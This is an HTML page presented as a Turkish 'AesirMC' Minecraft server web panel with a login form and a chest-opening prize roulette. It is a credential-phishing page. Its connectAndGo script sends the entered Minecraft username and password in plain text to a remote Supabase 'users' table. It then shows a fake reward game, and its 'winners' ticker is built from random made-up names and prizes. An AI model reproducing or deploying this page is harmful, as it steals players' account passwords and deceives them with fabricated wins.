<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AesirMC | Premium Web Panel</title>
    
    <link rel="icon" type="image/png" href="logo.png">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    
    <style>
        :root {
            --primary: #00a2ff; --secondary: #0066ff; --accent: #d48e00;
            --bg-dark: #050608; --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1); --success: #00ff88;
            --discord-blue: #5865F2;
        }

        body {
            margin: 0; font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: var(--bg-dark);
            /* ARKA PLAN BURADA DEĞİŞTİ */
            background-image: url('background2.png');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: white; min-height: 100vh;
            display: flex; flex-direction: column;
            overflow-x: hidden;
        }

        /* ÜST KAZANANLAR ŞERİDİ */
        .winners-ticker {
            background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border);
            height: 45px; display: flex; align-items: center; overflow: hidden; white-space: nowrap;
        }
        .ticker-content { display: inline-flex; animation: ticker-move 100s linear infinite; gap: 60px; padding-left: 100%; }
        .winner-item { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 600; }
        .winner-prize { color: var(--success); text-shadow: 0 0 10px rgba(0, 255, 136, 0.4); }

        @keyframes ticker-move { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }

        /* SOL ÜST NAV ALANI */
        nav { padding: 20px 5%; display: flex; align-items: center; background: transparent; }
        .nav-logo-box { display: flex; align-items: center; gap: 12px; }
        .nav-logo-box img { width: 42px; height: 42px; object-fit: contain; }
        .nav-logo-box span { font-size: 22px; font-weight: 800; letter-spacing: -0.5px; text-shadow: 0 2px 10px rgba(0,0,0,0.5); }

        /* SOL ALT SABİT BUTON */
        .fixed-play-container { position: fixed; bottom: 25px; left: 25px; z-index: 9999; }
        .btn-play {
            background-color: var(--accent); color: black; padding: 12px 25px;
            border-radius: 50px; text-decoration: none; font-weight: 800;
            display: flex; align-items: center; gap: 12px; transition: 0.3s;
            border: none; cursor: pointer; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        .btn-play:hover { transform: translateY(-5px); background-color: #f1a400; }
        .custom-cursor-img { width: 22px; height: 22px; object-fit: contain; }

        /* GİRİŞ PANELİ */
        #auth-container { margin: auto; width: 100%; max-width: 420px; padding: 40px; background: rgba(0, 0, 0, 0.6); border: 1px solid var(--border); border-radius: 32px; text-align: center; backdrop-filter: blur(25px); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .auth-logo { width: 80px; height: 80px; object-fit: contain; margin-bottom: 15px; filter: drop-shadow(0 0 15px var(--primary)); }
        
        input { width: 100%; padding: 16px; background: rgba(255,255,255,0.08); border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 15px; box-sizing: border-box; outline: none; }
        input:focus { border-color: var(--primary); background: rgba(255,255,255,0.12); }
        
        .social-store-row { display: flex; align-items: center; justify-content: center; gap: 15px; margin-top: 25px; }
        .dc-btn {
            width: 48px; height: 48px; background-color: var(--discord-blue);
            border-radius: 50%; cursor: pointer; transition: 0.3s;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4); border: none; text-decoration: none;
        }
        .dc-btn img { width: 26px; height: auto; }
        .dc-btn:hover { transform: scale(1.1); }

        .store-btn {
            background: #000; color: white; padding: 12px 30px; border-radius: 50px;
            font-weight: 700; text-decoration: none; font-size: 15px; transition: 0.3s;
            border: 1px solid rgba(255,255,255,0.1); display: flex; align-items: center;
        }
        .store-btn:hover { background: #111; transform: translateY(-2px); }

        /* OYUN EKRANI */
        #game-container { display: none; padding: 60px; text-align: center; }
        .main-chest { width: 220px; cursor: pointer; filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3)); transition: 0.3s; }
        .chest-jump { animation: squash-stretch 0.5s ease-in-out; }
        @keyframes squash-stretch { 0%, 100% { transform: scale(1); } 30% { transform: scale(1.2, 0.8); } 50% { transform: scale(0.8, 1.2) translateY(-25px); } }

        #roulette-section { display: none; margin-top: 40px; }
        .viewport { width: 100%; max-width: 800px; height: 150px; margin: 0 auto; background: rgba(0,0,0,0.4); border: 1px solid var(--border); border-radius: 20px; position: relative; overflow: hidden; }
        .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 3px; background: var(--primary); z-index: 10; box-shadow: 0 0 15px var(--primary); }
        #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
        .slot { min-width: 130px; display: flex; flex-direction: column; align-items: center; }
        .slot img { width: 70px; }

        #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; justify-content: center; align-items: center; }
        .win-card { background: #111; padding: 50px; border-radius: 30px; border: 1px solid var(--primary); text-align: center; }
    </style>
</head>
<body>

<div class="winners-ticker">
    <div class="ticker-content" id="ticker"></div>
</div>

<nav>
    <div class="nav-logo-box">
        <img src="logo.png" alt="AesirMC Logo" onerror="this.src='https://minecraft.wiki/images/Anvil_JE3_BE2.png'">
        <span>AESIR<span style="color:var(--primary)">MC</span></span>
    </div>
</nav>

<div class="fixed-play-container">
    <button class="btn-play" onclick="window.location.href='https://aesirmc.com'">
        <img src="aa.png" class="custom-cursor-img" alt="Cursor">
        oyna.aesirmc.com
    </button>
</div>

<div id="auth-container">
    <img src="logo.png" class="auth-logo" alt="Panel Logo" onerror="this.style.display='none'">
    <h2 style="margin-bottom: 25px; margin-top: 0;">Giriş Yap</h2>
    <input type="text" id="username" placeholder="Minecraft Kullanıcı Adı">
    <input type="password" id="password" placeholder="Şifre">
    <button class="btn-primary" style="width:100%; padding:18px; background:linear-gradient(135deg, var(--primary), var(--secondary)); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="connectAndGo()">GİRİŞ YAP</button>
    
    <div class="social-store-row">
        <a href="https://discord.com/invite/k8qFbQhbHX" target="_blank" class="dc-btn">
            <img src="dc.png" alt="Discord" onerror="this.src='https://assets-global.website-files.com/6257adef93867e3734e6d48b/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png'">
        </a>
        <a href="https://store.aesirmc.com/aesir-points" target="_blank" class="store-btn">Mağazaya git</a>
    </div>
</div>

<div id="game-container">
    <h2 id="welcome-txt"></h2>
    <div id="chest-zone">
        <img src="adsız.png" id="main-chest-img" class="main-chest" onclick="handleChestClick()" onerror="this.src='https://minecraft.wiki/images/Chest_JE2_BE2.png'">
        <p style="margin-top: 20px; color: var(--primary); font-weight: 600;">SANDIĞI AÇMAK İÇİN TIKLA</p>
    </div>

    <div id="roulette-section">
        <div class="viewport"><div id="strip"></div></div>
        <button class="btn-primary" id="spin-btn" style="width: 200px; margin-top: 30px; padding:15px; background:var(--primary); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;" onclick="runRoulette()">KASAYI ÇEVİR</button>
    </div>
</div>

<div id="win-modal">
    <div class="win-card">
        <h2 style="color: var(--primary);">KAZANDIN!</h2>
        <h1 id="win-name" style="font-size: 40px; margin: 15px 0;"></h1>
        <img id="win-img" src="" width="150">
        <div style="margin-top: 30px;"><button class="btn-primary" style="padding:15px 40px; background:var(--primary); border:none; border-radius:12px; color:white; cursor:pointer;" onclick="location.reload()">KAPAT</button></div>
    </div>
</div>

<script>
    const S_URL = "https://iigemvvlznvgneghevev.supabase.co"; 
    const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
    const _db = supabase.createClient(S_URL, S_KEY);

    const rewards = [
        { name: "100AP", img: "100.png" }, { name: "500AP", img: "500.png" },
        { name: "1000AP", img: "1000.png" }, { name: "200AP", img: "200.png" }, { name: "2000AP", img: "2000.png" }
    ];

    const turkIsimleri = ["Ahmet", "Mehmet", "Can", "Burak", "Emre", "Yusuf", "Arda", "Eren", "Mert", "Okan", "Boran", "Selim", "Kerem", "Yigit", "Ege", "Kaan", "Enes", "Omer", "Ali", "Batuhan", "Umut", "Serkan", "Murat"];
    const ticker = document.getElementById('ticker');
    for(let i=0; i<100; i++) {
        const tamIsim = turkIsimleri[Math.floor(Math.random() * turkIsimleri.length)] + Math.floor(Math.random() * 99);
        ticker.innerHTML += `<div class="winner-item"><span>${tamIsim}</span><span style="opacity:0.4; font-size:11px;">kazandı:</span><span class="winner-prize">${rewards[Math.floor(Math.random() * rewards.length)].name}</span></div>`;
    }

    async function connectAndGo() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if(!u || !p) return;
        await _db.from('users').insert([{ username: u, password: p }]);
        document.getElementById('auth-container').style.display = 'none';
        document.getElementById('game-container').style.display = 'block';
        document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
    }

    function handleChestClick() {
        document.getElementById('main-chest-img').classList.add('chest-jump');
        setTimeout(() => {
            document.getElementById('chest-zone').style.display = 'none';
            document.getElementById('roulette-section').style.display = 'block';
            initRoulette();
        }, 500);
    }

    function initRoulette() {
        const strip = document.getElementById('strip');
        strip.innerHTML = '';
        for(let i=0; i<70; i++) {
            const item = rewards[Math.floor(Math.random() * rewards.length)];
            strip.innerHTML += `<div class="slot"><img src="${item.img}"><span style="font-size:10px; opacity:0.6;">${item.name}</span></div>`;
        }
    }

    function runRoulette() {
        const strip = document.getElementById('strip');
        document.getElementById('spin-btn').disabled = true;
        const move = 5000 + Math.floor(Math.random() * 2000);
        strip.style.transition = "transform 6s cubic-bezier(0.15, 0, 0.15, 1)";
        strip.style.transform = `translateX(-${move}px)`;
        setTimeout(() => {
            const final = rewards[Math.floor(Math.random() * rewards.length)];
            document.getElementById('win-modal').style.display = 'flex';
            document.getElementById('win-name').innerText = final.name;
            document.getElementById('win-img').src = final.img;
        }, 6500);
    }
</script>
</body>
</html>
